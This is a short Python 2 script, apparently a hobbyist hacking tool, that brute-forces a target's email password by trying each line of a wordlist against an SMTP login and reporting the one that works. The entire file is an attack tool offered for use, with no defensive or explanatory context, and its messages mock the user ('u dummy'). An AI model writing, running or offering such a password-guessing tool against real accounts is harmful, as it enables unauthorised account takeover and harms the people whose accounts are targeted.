import smtplib

smtpserver = smtplib.SMTP("smtp.google.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the targets email address: ")

pwfile = raw_input("password file: ")
pwfile = open(pwfile, "r")


for password in pwfile:
    try:
        smtpserver.login(user, password)
        print "[+] Password Found %s" % password
        break;
        
    except smtplib.SMTPAuthenticationError:
        print "[!] Pass incorrect get a good password file u dummy %s" % password